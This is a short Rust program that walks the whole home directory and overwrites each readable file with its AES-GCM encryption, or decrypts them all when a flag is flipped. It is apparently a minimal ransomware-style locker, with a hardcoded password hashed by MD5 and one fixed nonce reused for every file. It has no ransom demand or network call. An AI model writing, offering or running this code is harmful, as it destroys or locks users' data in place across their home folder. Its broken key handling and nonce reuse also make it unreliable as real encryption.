use std::env;
use walkdir::WalkDir;
use aes_gcm::{Aes256Gcm, Key, Nonce}; // Or `Aes128Gcm`
use aes_gcm::aead::{Aead, NewAead};
use std::fs;
use std::fs::File;
use std::io::Write;

fn main() {

    // ONLY NEED TO EDIT THIS
    let password = "Password";
    let encrypt = true; //true to encrpt all and false to decrypt all

    let nonce = Nonce::from_slice(b"unique nonce");
    let md5 = format!("{:x}", md5::compute(password));
    let key = Key::from_slice(md5.as_ref());
    let cipher = Aes256Gcm::new(key);
    for entry in WalkDir::new(env::home_dir().unwrap().display().to_string()).into_iter().filter_map(|e| e.ok()) {
        match fs::read_to_string(entry.path().display().to_string()) {
            Ok(x) => {
                if encrypt {
                    write_file(entry.path().display().to_string(), hex::encode(cipher.encrypt(nonce, x.as_ref())
                    .expect("encryption failure!")));
                }
                else {
                    let decoded = hex::decode(x.clone()).unwrap();
                    let plaintext = cipher.decrypt(nonce, decoded.as_ref())
                        .expect("decryption failure!");
                    write_file(entry.path().display().to_string(), String::from_utf8_lossy(&*plaintext).to_string());
                }
            },
            _ => {}
        }
    }
}

fn write_file(file:String, text:String) -> std::io::Result<()> {
    let mut file = File::create(file)?;
    file.write_all(text.trim().as_ref())?;
    Ok(())
}